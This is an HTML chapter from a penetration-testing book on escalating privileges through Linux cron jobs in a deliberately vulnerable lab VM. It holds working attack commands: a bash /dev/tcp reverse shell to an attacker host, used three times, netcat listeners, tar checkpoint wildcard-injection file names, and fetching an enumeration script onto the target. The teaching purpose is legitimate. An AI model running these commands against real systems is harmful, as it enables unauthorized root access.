@@ -1,0 +1,198 @@
+<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer322">
+			<h1 id="_idParaDest-154"><em class="italic"><a id="_idTextAnchor162"/>Chapter 12</em>: Scheduled Tasks</h1>
+			<p>One of the most important privilege escalation vectors on Linux is exploiting misconfigured scheduled tasks, also known as <strong class="bold">cron jobs</strong>. This chapter will focus on the process of enumerating the scheduled tasks running on the target system, analyzing them for misconfigurations, and exploiting them to elevate our privileges.</p>
+			<p>We will start this chapter by looking at how Linux implements scheduled tasks with cron, after which we will take a look at how to escalate our privileges through cron paths. We will then take a look at how to exploit cron wildcards to elevate our privileges, before exploring the process of escalating our privileges via cron file overwrites.</p>
+			<p>In this chapter, we're going to cover the following main topics:</p>
+			<ul>
+				<li>Introduction to cron jobs</li>
+				<li>Escalation via cron paths</li>
+				<li>Escalation via cron wildcards</li>
+				<li>Escalation via cron file overwrites</li>
+			</ul>
+			<h1 id="_idParaDest-155"><a id="_idTextAnchor163"/>Technical requirements </h1>
+			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you have familiarity with Linux Terminal commands.</p>
+			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3F3747S">https://bit.ly/3F3747S</a></p>
+			<h1 id="_idParaDest-156"><a id="_idTextAnchor164"/>Introduction to cron jobs</h1>
+			<p>The ability to schedule tasks on an operating system is a vitally important feature that can improve the <a id="_idIndexMarker623"/>efficiency of the tasks being performed on the system and, consequently, the efficiency of the individuals responsible for managing and maintaining the system. This functionality may not be fully realized or appreciated in desktop operating systems that are typically geared toward regular end users, but in the case of Linux, where it is mostly deployed as a server operating system, the ability to automate and schedule certain repetitive tasks such as system backups is greatly appreciated and is widely implemented by system administrators and engineers.</p>
+			<p>Linux implements task <a id="_idIndexMarker624"/>scheduling through a utility called <strong class="bold">cron</strong>. Cron is a time-based service that runs applications, scripts, and other commands repeatedly on a specified schedule.</p>
+			<p>An application or script that has been configured to be run repeatedly with cron is known as a cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches. </p>
+			<p>Cron allows you <a id="_idIndexMarker625"/>to run a program, script, or command periodically at whatever time you choose. These cron jobs are then stored in the <strong class="source-inline">crontab</strong> file. </p>
+			<p>The <strong class="source-inline">crontab</strong> file is a configuration file that is used by the cron utility to store and track cron jobs that have been created.</p>
+			<p>Now that you have an understanding of what cron is and what it does, let's take a look at how cron jobs are stored in the <strong class="source-inline">crontab</strong> file.</p>
+			<h2 id="_idParaDest-157"><a id="_idTextAnchor165"/>The crontab file</h2>
+			<p>You can list the <a id="_idIndexMarker626"/>cron jobs running on a system by running the following command on the target system:</p>
+			<p class="source-code">crontab</p>
+			<p>Alternatively, if the user you are currently logged in as doesn't have the necessary permissions to utilize the <strong class="source-inline">crontab</strong> command, you can also manually display the contents of the <strong class="source-inline">crontab</strong> file by running the following command:</p>
+			<p class="source-code">cat /etc/crontab</p>
+			<p>As shown in the following screenshot, this will output a list of all active cron jobs, as well as their respective schedules, applications, scripts, or commands they have been configured to run:</p>
+			<div>
+				<div id="_idContainer299" class="IMG---Figure">
+					<img src="Images/B17389_12_001.jpg" alt="Figure 12.1 – Contents of the crontab file&#13;&#10;" width="1314" height="472"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.1 – Contents of the crontab file</p>
+			<p>To understand how we can exploit cron jobs to elevate our privileges, we need to have an understanding <a id="_idIndexMarker627"/>of how the <strong class="source-inline">crontab</strong> file is structured and how the schedules for the cron jobs are configured.</p>
+			<p>This can be achieved through a simple example. The <strong class="source-inline">crontab</strong> entry highlighted in the following screenshot schedules the command to be run at the 17th minute of every hour, repeatedly:</p>
+			<div>
+				<div id="_idContainer300" class="IMG---Figure">
+					<img src="Images/B17389_12_002.jpg" alt="Figure 12.2 – Example of a cron job &#13;&#10;" width="890" height="57"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.2 – Example of a cron job </p>
+			<p>The first five fields at the beginning of the cron job entry are used to specify the scheduled time. These fields are used to specify the following values:</p>
+			<ul>
+				<li><strong class="bold">Minute (0 – 59)</strong>: Used to specify the minute the cron job should be run.</li>
+				<li><strong class="bold">Hour (0 – 23)</strong>: Used to specify the hour of the day the cron job should be run.</li>
+				<li><strong class="bold">Day of the month (1 – 31)</strong>: Used to specify the specific day of the month the cron job should be run.</li>
+				<li><strong class="bold">Month (1 – 12)</strong>: Used to specify the month when the cron job should be run.</li>
+				<li><strong class="bold">Day of the week (0 – 7)</strong>: Used to specify the day of the week when the cron job should be run.</li>
+			</ul>
+			<p>As you may have noticed, some fields have an asterisk (<strong class="source-inline">*</strong>) as a value, which means that the cron job will run on all of the hours, days, weeks, and months unless specified otherwise. In this case, the cron job will run at the 17th minute of every hour, day, month, and day of the week:</p>
+			<div>
+				<div id="_idContainer301" class="IMG---Figure">
+					<img src="Images/B17389_12_003.jpg" alt="Figure 12.3 – Cron job syntax &#13;&#10;" width="422" height="230"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.3 – Cron job syntax </p>
+			<p>The preceding screenshot outlines the syntax of a cron job and the various fields that can be customized to configure the schedule for the cron job.</p>
+			<p>Cron jobs can <a id="_idIndexMarker628"/>also be run as any user on the system. This is a very important factor to keep an eye on as we will be targeting cron jobs that have been configured to be run as the root user. This is primarily because any script or command that is run by a cron job will run as the root user and, consequently, provide us with root access.</p>
+			<p>Now that you have an understanding of how cron jobs work and how they are configured, we can begin the process of analyzing them for misconfigurations to elevate our privileges.</p>
+			<p>In this chapter, we will be utilizing the virtual machine we set up in <a href="B17389_11_Final_PG_ePub.xhtml#_idTextAnchor152"><em class="italic">Chapter 11</em></a>, <em class="italic">Linux Password Mining</em>. This is because the virtual machine has been configured to be vulnerable and has various cron jobs that can be used to demonstrate various privilege escalation techniques.</p>
+			<h1 id="_idParaDest-158"><a id="_idTextAnchor166"/>Escalation via cron paths</h1>
+			<p>The first privilege <a id="_idIndexMarker629"/>escalation technique we will be exploring is the process of exploiting poorly configured cron paths. However, before we can begin this process, let's take a quick look at the various ways of accessing the <strong class="source-inline">crontab</strong> file on the target system.</p>
+			<p>The reason we need to do this is because we will come across systems that have been configured differently and can access the <strong class="source-inline">crontab</strong> file, so enumerating cron jobs running on a system is vitally important in the privilege escalation process.</p>
+			<p>As demonstrated in the previous section, you can access the <strong class="source-inline">crontab</strong> file on the target system by running the following command:</p>
+			<p class="source-code">crontab</p>
+			<p>This command <a id="_idIndexMarker630"/>may not yield any results if access to the utility has been limited by the administrator. However, you can use the following commands to enumerate information regarding the active cron jobs on the system:</p>
+			<p class="source-code">crontab -l</p>
+			<p class="source-code">ls -alh /var/spool/cron;</p>
+			<p class="source-code">ls -al /etc/ | grep cron</p>
+			<p class="source-code">ls -al /etc/cron*</p>
+			<p class="source-code">cat /etc/cron*</p>
+			<p class="source-code">cat /etc/at.allow</p>
+			<p class="source-code">cat /etc/at.deny</p>
+			<p class="source-code">cat /etc/cron.allow</p>
+			<p class="source-code">cat /etc/cron.deny*</p>
+			<p>Accessing the files and directories listed here should yield information regarding the active cron jobs on the system.</p>
+			<h2 id="_idParaDest-159"><a id="_idTextAnchor167"/>Enumeration with linPEAS</h2>
+			<p>We can also <a id="_idIndexMarker631"/>enumerate the various cron jobs running on a system with automated tools. This can be done by using <strong class="source-inline">linux-exploit-suggester</strong> or other <a id="_idIndexMarker632"/>enumeration scripts and tools. In this case, we will utilize the <strong class="bold">linPEAS</strong> script to enumerate information from our target.</p>
+			<p class="callout-heading">Note</p>
+			<p class="callout">linPEAS is a local Linux enumeration script that searches and scans for potential vulnerabilities, and also enumerates all important system information that can be used to stage a privilege escalation attack.</p>
+			<p>The linPEAS <a id="_idIndexMarker633"/>binary can be downloaded from the following GitHub repository: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a>.</p>
+			<p>Ensure you <a id="_idIndexMarker634"/>download the <strong class="source-inline">linpeas.sh</strong> Bash script, as highlighted in the following screenshot:</p>
+			<div>
+				<div id="_idContainer302" class="IMG---Figure">
+					<img src="Images/B17389_12_004.jpg" alt="Figure 12.4 – linPEAS Bash script&#13;&#10;" width="576" height="239"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.4 – linPEAS Bash script</p>
+			<p>After downloading the Bash script to our Kali VM, we need to transfer the <strong class="source-inline">linpeas.sh</strong> file to our target virtual machine. This cannot be done automatically as we do not have a Meterpreter session. As a result, we will need to make use of Linux-specific utilities to download the binary.</p>
+			<h2 id="_idParaDest-160"><a id="_idTextAnchor168"/>Transferring files</h2>
+			<p>To transfer <a id="_idIndexMarker635"/>the <strong class="source-inline">linpeas.sh</strong> file to our target, we will need to set up a web server on our Kali VM that will be used to host the file. This will allow us to download it on the target system. This can be done by following these steps:</p>
+			<ol>
+				<li>To set up a web server on our Kali VM, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the binary file. This can be done by running the following command in the directory where the <strong class="source-inline">linpeas.sh</strong> binary is stored:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p><p class="callout-heading">Note</p><p class="callout"><strong class="source-inline">SimpleHTTPServer</strong> is a Python module for Python 2 that is also available for Python 3 as <strong class="source-inline">http.server</strong>.</p><p>As highlighted <a id="_idIndexMarker636"/>in the following screenshot, the <strong class="source-inline">SimpleHTTPServer</strong> module will serve the files in the directory on the Kali VM IP address on port <strong class="source-inline">80</strong>:</p><div id="_idContainer303" class="IMG---Figure"><img src="Images/B17389_12_005.jpg" alt="Figure 12.5 – SimpleHTTPServer linpeas&#13;&#10;" width="605" height="251"/></div><p class="figure-caption">Figure 12.5 – SimpleHTTPServer linpeas</p></li>
+				<li>To download the <strong class="source-inline">linpeas.sh</strong> file on the target system, we can utilize the <strong class="source-inline">wget</strong> utility. Before we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the temporary directory, as illustrated in the following screenshot:<div id="_idContainer304" class="IMG---Figure"><img src="Images/B17389_12_006.jpg" alt="Figure 12.6 – Linux temporary directory&#13;&#10;" width="304" height="95"/></div><p class="figure-caption">Figure 12.6 – Linux temporary directory</p></li>
+				<li>We can now use the <strong class="source-inline">wget</strong> utility to download the file from the Kali VM to our target system. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">wget http://&lt;KALI-VM-IP&gt;/linpeas.sh</strong></p><p>The <a id="_idIndexMarker637"/>output is shown in the following screenshot:</p></li>
+			</ol>
+			<div>
+				<div id="_idContainer305" class="IMG---Figure">
+					<img src="Images/B17389_12_007.jpg" alt="Figure 12.7 – wget linPEAS&#13;&#10;" width="1420" height="400"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.7 – wget linPEAS</p>
+			<p>As shown in the preceding screenshot, if the transfer is successful, the <strong class="source-inline">linpeas.sh</strong> file should be downloaded and saved with the name we specified.</p>
+			<p>We can now use the <strong class="source-inline">linpeas.sh</strong> script to enumerate the various cron jobs running on the target system.</p>
+			<h2 id="_idParaDest-161"><a id="_idTextAnchor169"/>Finding cron jobs with linPEAS</h2>
+			<p>The <strong class="source-inline">linpeas.sh</strong> script enumerates a lot of information and will perform various checks to discover <a id="_idIndexMarker638"/>potential vulnerabilities on the target system. We can use the <strong class="source-inline">linpeas.sh</strong> script to enumerate and locate the cron jobs running on the system. This can be done by following these steps:</p>
+			<ol>
+				<li value="1">To enumerate all the important system information, we need to run the <strong class="source-inline">linpeas.sh</strong> script. However, before we do that, we need to ensure the script has executable permissions. This can be done by running the following command in the target:<p class="source-code"><strong class="bold">chmod +x linpeas.sh</strong></p><p>Alternatively, you can modify the permissions of the <strong class="source-inline">linpeas.sh</strong> script by running the following command:</p><p class="source-code"><strong class="bold">chmod 775 linpeas.sh</strong></p></li>
+				<li>We can <a id="_idIndexMarker639"/>now run the <strong class="source-inline">linpeas.sh</strong> script by running the following command on the target:<p class="source-code"><strong class="bold">bash linpeas.sh</strong></p><p>As shown in the following screenshot, the script will enumerate system information and display a list of cron jobs running on the system, as well as the default <strong class="source-inline">$PATH</strong> variable:</p></li>
+			</ol>
+			<div>
+				<div id="_idContainer306" class="IMG---Figure">
+					<img src="Images/B17389_12_008.jpg" alt="Figure 12.8 – linPEAS cron jobs&#13;&#10;" width="1075" height="166"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.8 – linPEAS cron jobs</p>
+			<p>In this case, our target is running two cron jobs as the <strong class="source-inline">root</strong> user that have been configured to run every 1 minute. We can use this information to identify specific misconfigurations in the scripts and commands that are executed by the cron jobs.</p>
+			<p>Now that we have been able to enumerate the various cron jobs running on the target system, we can begin the privilege escalation process.</p>
+			<h2 id="_idParaDest-162"><a id="_idTextAnchor170"/>Escalating privileges via cron paths</h2>
+			<p>This particular <a id="_idIndexMarker640"/>privilege escalation technique involves identifying the default <strong class="source-inline">$PATH</strong> variable that's been configured for cron jobs in the <strong class="source-inline">crontab</strong> file, generating a payload, and placing it in the path:</p>
+			<div>
+				<div id="_idContainer307" class="IMG---Figure">
+					<img src="Images/B17389_12_009.jpg" alt="Figure 12.9 – The PATH variable &#13;&#10;" width="1074" height="93"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.9 – The PATH variable </p>
+			<p class="callout-heading">Note</p>
+			<p class="callout">The <strong class="source-inline">$PATH</strong> variable is used to set the default path that the cron jobs will run from, unless specified otherwise.</p>
+			<p>As highlighted in the preceding screenshot, the <strong class="source-inline">$PATH</strong> variable has been set as the home directory of the <strong class="source-inline">user</strong> account. This means that, by default, all the cron jobs will run from the <strong class="source-inline">user</strong> account's home directory, unless specified otherwise.</p>
+			<p>This can be construed as a misconfiguration as the <strong class="source-inline">user</strong> account can access files and scripts that <a id="_idIndexMarker641"/>are used by the cron jobs. We can exploit this misconfiguration by identifying cron jobs that utilize scripts or binaries that are stored in the <strong class="source-inline">user</strong> account's home directory.</p>
+			<p>Analyzing the <strong class="source-inline">crontab</strong> file reveals an interesting cron job that runs a Bash script named <strong class="source-inline">overwrite.sh</strong> as the <strong class="source-inline">root</strong> user:</p>
+			<div>
+				<div id="_idContainer308" class="IMG---Figure">
+					<img src="Images/B17389_12_010.jpg" alt="Figure 12.10 – Overwrite cron job&#13;&#10;" width="1422" height="322"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.10 – Overwrite cron job</p>
+			<p>As highlighted in the preceding screenshot, the cron job has also been configured to run every 1 minute of every hour, every day, and every month.</p>
+			<p>Now that we have identified a potential cron job that has the necessary requirements, we can begin the privilege escalation process:</p>
+			<ol>
+				<li value="1">The first step in this process involves locating and identifying the location of the <strong class="source-inline">overwrite.sh</strong> script that is run by the cron job. We were able to determine the default path used by the cron job is the <strong class="source-inline">user</strong> account's home directory. We can display the contents of the directory by running the following command:<p class="source-code"><strong class="bold">ls -al /home/user/</strong></p><p>The output is as follows:</p><div id="_idContainer309" class="IMG---Figure"><img src="Images/B17389_12_011.jpg" alt="Figure 12.11 – The user home directory&#13;&#10;" width="773" height="460"/></div><p class="figure-caption">Figure 12.11 – The user home directory</p><p>As illustrated in the preceding screenshot, we are unable to locate the <strong class="source-inline">overwrite.sh</strong> script in the <strong class="source-inline">user</strong> home directory. This could be because the <strong class="source-inline">root</strong> user has <a id="_idIndexMarker642"/>not created the script yet. In any event, we can create the script ourselves and get it to provide us with a reverse shell with root privileges as the cron job will execute the script as the ro<a id="_idTextAnchor171"/>ot user.</p></li>
+				<li>We can create the <strong class="source-inline">overwrite.sh</strong> script and insert a Bash command that will provide us with a reverse shell. This can be done by running the following command in the <strong class="source-inline">user</strong> home directory:<p class="source-code"><strong class="bold">echo "bash -i &gt;&amp; /dev/tcp/&lt;KALI-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1" &gt; overwrite.sh</strong></p><p>This command will add a <strong class="source-inline">bash</strong> command that will connect to our reverse listener on the Kali Linux VM. Ensure that you replace the fields in the command with the respective IP address and port number.</p><p>After running the preceding command, the <strong class="source-inline">overwrite.sh</strong> file should have been created, and it should contain the command outlined in the following screenshot:</p><div id="_idContainer310" class="IMG---Figure"><img src="Images/B17389_12_012.jpg" alt="Figure 12.12 – Overwrite file &#13;&#10;" width="567" height="92"/></div><p class="figure-caption">Figure 12.12 – Overwrite file </p><p>Once we have created this file, we need to set up a reverse listener with Netcat.</p></li>
+				<li>We can <a id="_idIndexMarker643"/>set up the reverse listener on the Kali VM by running the following command:<p class="source-code"><strong class="bold">nc -nvlp &lt;PORT&gt;</strong></p><p>Ensure that you specify the port that you used in the <strong class="source-inline">overwrite.sh</strong> script. After setting up the listener, we will need to wait for a few minutes for the cron job to run.</p><p>Once the cron job has been invoked, the <strong class="source-inline">overwrite.sh</strong> script will be executed. We should get a reverse shell on our listener with root privileges, as highlighted in the following screenshot:</p></li>
+			</ol>
+			<div>
+				<div id="_idContainer311" class="IMG---Figure">
+					<img src="Images/B17389_12_013.jpg" alt="Figure 12.13 – Reverse shell&#13;&#10;" width="823" height="234"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.13 – Reverse shell</p>
+			<p>With that, we have successfully elevated our privileges by leveraging a misconfiguration in the crontab <strong class="source-inline">$PATH</strong> variable. This allowed us to execute a custom command that provided us with an elevated reverse shell on the target system.</p>
+			<h1 id="_idParaDest-163"><a id="_idTextAnchor172"/>Escalation via cron wildcards</h1>
+			<p>This privilege escalation technique involves taking advantage of cron jobs that execute commands <a id="_idIndexMarker644"/>or scripts with wildcards. In the context of Linux, wildcards (<strong class="source-inline">*</strong>) are used to perform more than one action at a time, and they can be used in a variety of different ways. In this section, we will explore how they can be exploited to execute malicious commands or scripts if misconfigured.</p>
+			<p class="callout-heading">Important Note</p>
+			<p class="callout">Note that the success of this technique will depend on whether or not wildcards have been utilized in cron jobs.</p>
+			<p>Follow these steps:</p>
+			<ol>
+				<li value="1">The first step in this process involves identifying cron jobs that run commands or scripts with wildcards. Analyzing the <strong class="source-inline">crontab</strong> file reveals an interesting cron job that is responsible for creating and compressing backup archives:<div id="_idContainer312" class="IMG---Figure"><img src="Images/B17389_12_014.jpg" alt="Figure 12.14 – Backup cron job&#13;&#10;" width="1422" height="380"/></div><p class="figure-caption">Figure 12.14 – Backup cron job</p><p>As highlighted in the preceding screenshot, the cron job runs the <strong class="source-inline">compress.sh</strong> script located under <strong class="source-inline">/usr/local/bin</strong> as the root user and runs every minute of every hour, every day, and every month.</p></li>
+				<li>We can display the content of the <strong class="source-inline">compress.sh</strong> script by running the following command:<p class="source-code"><strong class="bold">cat /usr/local/bin/compress.sh</strong></p><p>The output is as follows:</p><div id="_idContainer313" class="IMG---Figure"><img src="Images/B17389_12_015.jpg" alt="Figure 12.15 – Displaying the content of the compress.sh script&#13;&#10;" width="640" height="146"/></div><p class="figure-caption">Figure 12.15 – Displaying the content of the compress.sh script</p><p>As highlighted in the preceding screenshot, we can identify that the script is executed from the <strong class="source-inline">user</strong> account's home directory and that the files have been compressed <a id="_idIndexMarker645"/>with the <strong class="source-inline">tar</strong> utility. However, we can also identify a wildcard (<strong class="source-inline">*</strong>) at the end of the <strong class="source-inline">tar</strong> command. The wildcard is used to specify all the files in the <strong class="source-inline">user</strong> account's home directory.</p></li>
+				<li>The <strong class="source-inline">tar</strong> utility has a checkpoint feature that is used to display progress messages after a specific set of files. It also allows users to define a specific action that is executed during the checkpoint. We can leverage this feature to execute a reverse shell payload that will provide us with an elevated session when executed. </li>
+				<li>We can create the reverse shell script and insert a <strong class="source-inline">bash</strong> command that will provide us with a reverse shell. This can be done by running the following command in the <strong class="source-inline">user</strong> home directory:<p class="source-code"><strong class="bold">echo 'bash -i &gt;&amp; /dev/tcp/&lt;KALI-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1' &gt; shell.sh</strong></p><p>This command will add a <strong class="source-inline">bash</strong> command that will connect to our reverse listener on the Kali Linux VM. Ensure that you replace the fields in the command with the respective IP address and port number.</p><p>After running the preceding command, the <strong class="source-inline">shell.sh</strong> file should have been created, and it should contain the command outlined in the following screenshot:</p><div id="_idContainer314" class="IMG---Figure"><img src="Images/B17389_12_016.jpg" alt="Figure 12.16 – Shell script&#13;&#10;" width="570" height="89"/></div><p class="figure-caption">Figure 12.16 – Shell script</p><p>Now that we have created the file, we need to set up a reverse listener with Netcat.</p></li>
+				<li>We can set <a id="_idIndexMarker646"/>up the reverse listener on the Kali VM by running the following command:<p class="source-code"><strong class="bold">nc -nvlp &lt;PORT&gt;</strong></p><p>Ensure that you specify the port that you used in the <strong class="source-inline">shell.sh</strong> script.</p></li>
+				<li>We can now set up our <strong class="source-inline">tar</strong> checkpoints in the <strong class="source-inline">user</strong> account's home directory. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">touch /home/user/--checkpoint=1</strong></p></li>
+				<li>After setting up our checkpoint, we need to set up our checkpoint action. In this case, our checkpoint action will execute the <strong class="source-inline">shell.sh</strong> script, which will provide us with an elevated reverse shell. This can be done by running the following command:<p class="source-code"><strong class="bold">touch /home/user/--checkpoint-action=exec=sh\ shell.sh</strong></p><p>After setting up the <strong class="source-inline">tar</strong> checkpoint and checkpoint action, we need to wait a few minutes for the cron job to be invoked, after which we should receive an elevated reverse shell on our Netcat listener, as highlighted in the following screenshot:</p></li>
+			</ol>
+			<div>
+				<div id="_idContainer315" class="IMG---Figure">
+					<img src="Images/B17389_12_017.jpg" alt="Figure 12.17 – Reverse shell&#13;&#10;" width="761" height="224"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.17 – Reverse shell</p>
+			<p>With that, we have successfully elevated our privileges by exploiting cron jobs that implement <a id="_idIndexMarker647"/>the improper use of wildcards to execute a reverse shell payload as the root user.</p>
+			<p>Now, let's take a look at how to elevate our privileges through cron file overwrites.</p>
+			<h1 id="_idParaDest-164"><a id="_idTextAnchor173"/>Escalation via cron file overwrites</h1>
+			<p>Another technique we can leverage to elevate our privileges is the ability to overwrite the content <a id="_idIndexMarker648"/>of scripts that are used by cron jobs. In the previous sections, we explored the process of leveraging misconfigured paths and utilizing wildcards. However, we did not explore the process of overwriting the content of scripts or files to elevate our privileges.</p>
+			<p class="callout-heading">Note</p>
+			<p class="callout">The success and viability of this technique will depend on whether we have the necessary permissions to write or make changes to the script or file being run by the cron job.</p>
+			<p>This technique can be performed by following these steps:</p>
+			<ol>
+				<li value="1">The first step in this process involves identifying a cron job that executes a script or binary with read and write permissions as the root user. In this case, we can identify a cron job that runs the <strong class="source-inline">overwrite.sh</strong> script when invoked, as highlighted in the following screenshot:<div id="_idContainer316" class="IMG---Figure"><img src="Images/B17389_12_018.jpg" alt="Figure 12.18 – Overwrite cron job" width="1422" height="331"/></div><p class="figure-caption">Figure 12.18 – Overwrite cron job</p><p>We looked at how to exploit this particular cron job in section two of this chapter, <em class="italic">Escalation via cron paths</em>, where we exploited a misconfigured path that allowed us to create a custom <strong class="source-inline">overwrite.sh</strong> script that provided us with an elevated reverse shell when executed. This was because the default path variable <a id="_idIndexMarker649"/>specified the <strong class="source-inline">user</strong> account's home directory as the primary directory for the cron job. However, if the <strong class="source-inline">overwrite.sh</strong> script is not found in the first directory, cron will check the other directories specified in the <strong class="source-inline">$PATH</strong> variable, as highlighted in the following screenshot:</p><div id="_idContainer317" class="IMG---Figure"><img src="Images/B17389_12_019.jpg" alt="Figure 12.19 – Crontab paths&#13;&#10;" width="1423" height="381"/></div><p class="figure-caption">Figure 12.19 – Crontab paths</p></li>
+				<li>In this case, we do not find the <strong class="source-inline">overwrite.sh</strong> script in the <strong class="source-inline">user</strong> account's home directory. As a result, we can search for the script in the other directories specified in the <strong class="source-inline">$PATH</strong> variable. This can be done by listing the contents of each directory, as follows:<p class="source-code"><strong class="bold">ls -al /usr/local/bin | grep overwrite.sh</strong></p><p>Alternatively, you can use the <strong class="source-inline">locate</strong> utility to search for the <strong class="source-inline">overwrite.sh</strong> script by running the following command:</p><p class="source-code"><strong class="bold">locate overwrite.sh</strong></p><p>In this case, we will find the file under the <strong class="source-inline">/usr/local/bin</strong> directory, as highlighted in the following screenshot:</p><div id="_idContainer318" class="IMG---Figure"><img src="Images/B17389_12_020.jpg" alt="Figure 12.20 – Locating the script&#13;&#10;" width="766" height="123"/></div><p class="figure-caption">Figure 12.20 – Locating the script</p></li>
+				<li>The next <a id="_idIndexMarker650"/>step involves identifying the permissions of the <strong class="source-inline">overwrite.sh</strong> to determine whether we can make changes or overwrite the content of the script. This can be done by running the following command:<p class="source-code"><strong class="bold">ls -al /usr/local/bin | grep overwrite.sh</strong></p><p>The output is shown in the following screenshot:</p><div id="_idContainer319" class="IMG---Figure"><img src="Images/B17389_12_021.jpg" alt="Figure 12.21 – File permissions&#13;&#10;" width="793" height="89"/></div><p class="figure-caption">Figure 12.21 – File permissions</p><p>In this case, we can determine that the script has read and write permissions. As a result, we can make changes or overwrite the file with our own commands.</p></li>
+				<li>Now, let's add a <strong class="source-inline">bash</strong> command that will provide us with a reverse shell to the <strong class="source-inline">overwrite.sh</strong> script. This can be done by running the following command:<p class="source-code"><strong class="bold">echo "bash -i &gt;&amp; /dev/tcp/&lt;KALI-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1" &gt;&gt; /usr/local/bin/overwrite.sh</strong></p><p>This command will append a <strong class="source-inline">bash</strong> command that will connect to our reverse listener on the Kali Linux VM. Ensure that you replace the fields in the command with the respective IP address and port number.</p><p>After running the preceding command, the <strong class="source-inline">overwrite.sh</strong> script should contain the command outlined in the following screenshot:</p><div id="_idContainer320" class="IMG---Figure"><img src="Images/B17389_12_022.jpg" alt="Figure 12.22 – The overwrite.sh script's appended command&#13;&#10;" width="657" height="180"/></div><p class="figure-caption">Figure 12.22 – The overwrite.sh script's appended command</p></li>
+				<li>Once we <a id="_idIndexMarker651"/>have appended the <strong class="source-inline">bash</strong> command, we will need to set up a reverse listener with Netcat.<p>We can set up the reverse listener on the Kali VM by running the following command:</p><p class="source-code"><strong class="bold">nc -nvlp &lt;PORT&gt;</strong></p><p>Ensure that you specify the port that you used in the <strong class="source-inline">overwrite.sh</strong> script.</p><p>After appending the <strong class="source-inline">bash</strong> command to the <strong class="source-inline">overwrite.sh</strong> script, we will need to wait for a few minutes for the cron job to be invoked, after which we should receive an elevated reverse shell on our Netcat listener, as highlighted in the following screenshot:</p></li>
+			</ol>
+			<div>
+				<div id="_idContainer321" class="IMG---Figure">
+					<img src="Images/B17389_12_023.jpg" alt="Figure 12.23 – Reverse shell&#13;&#10;" width="768" height="223"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 12.23 – Reverse shell</p>
+			<p>With that, we have successfully elevated our privileges by exploiting cron jobs that run scripts with misconfigured permissions to execute a reverse shell payload as the root user.</p>
+			<p>You should <a id="_idIndexMarker652"/>now have a firm grasp of how to enumerate the cron jobs running on a system, as well as how to exploit them through various techniques to elevate your privileges.</p>
+			<h1 id="_idParaDest-165"><a id="_idTextAnchor174"/>Summary</h1>
+			<p>In this chapter, we started by looking at how the cron utility works and the structure of the crontab file. We then took an in-depth look at how to exploit misconfigured cron paths. We also explored the process of exploiting wildcards in scripts executed by cron jobs to elevate our privileges. Finally, we ended this chapter by looking at how to elevate our privileges through cron file overwrites.</p>
+			<p>In the next chapter, we will look at how to exploit SUDO and SUID binaries to elevate our privileges.</p>
+		</div>
+	</div></body></html>
